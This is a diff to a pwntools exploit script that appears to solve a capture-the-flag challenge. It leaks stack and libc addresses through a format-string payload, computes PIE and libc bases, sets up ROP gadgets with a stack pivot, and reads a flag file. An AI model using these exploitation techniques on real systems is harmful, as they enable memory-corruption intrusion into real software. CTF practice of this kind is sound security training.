@@ -68,7 +68,7 @@ def format_str_write_addr(addr: int, value: int):
     send_cmd2srv("global", "write")
 
 # Leak All Address
-payload = b"%17$lx|%19$lx|%8$lx|%7$lx\n"
+payload = b"%17$lx|%19$lx|%7$lx\n"
 
 send_cmd2srv("global", "read", payload)
 send_cmd2srv("global", "write")
@@ -77,12 +77,10 @@ tmp = r.recvline().split(b"|")
 
 PIE_BASE = int(tmp[0].decode(), 16) - 100 - 0x15fd
 LIBC_BASE = int(tmp[1].decode(), 16) - 243 - 0x26fc0
-ROP_STACK_BASE = int(tmp[2].decode(), 16) + 8
-GLOBAL_VAR_POS = int(tmp[3].decode(), 16)
+GLOBAL_VAR_POS = int(tmp[2].decode(), 16)
 
 log.info("PIE_BASE: " + hex(PIE_BASE))
 log.info("LIBC_BASE: " + hex(LIBC_BASE))
-log.info("ROP_STACK_BASE: " + hex(ROP_STACK_BASE))
 log.info("GLOBAL_VAR_POS: " + hex(GLOBAL_VAR_POS))
 
 # Prepare All Gadgets
@@ -93,8 +91,6 @@ POP_RSI = LIBC_BASE + 0x27529
 SYSCALL_RET = LIBC_BASE + 0x66229
 STACK_PIVOT_RET = LIBC_BASE + 0x5aa48
 FINAL_STACK_PIVOT = GLOBAL_VAR_POS + 0x50
-
-CALL_CHAL_POS = PIE_BASE + 0x15fd + 90
 
 # ROP Gadget Start
 FLAG_PATH = "/home/fullchain-nerf/flag"
@@ -146,4 +142,5 @@ send_cmd2srv("global", "read", (FLAG_PATH+"\0").encode())
 
 log.info("FINAL OVERFLOW DONE!")
 
-r.interactive()
+r.recvline()
+print("Final Flag: " + r.recvline().decode())
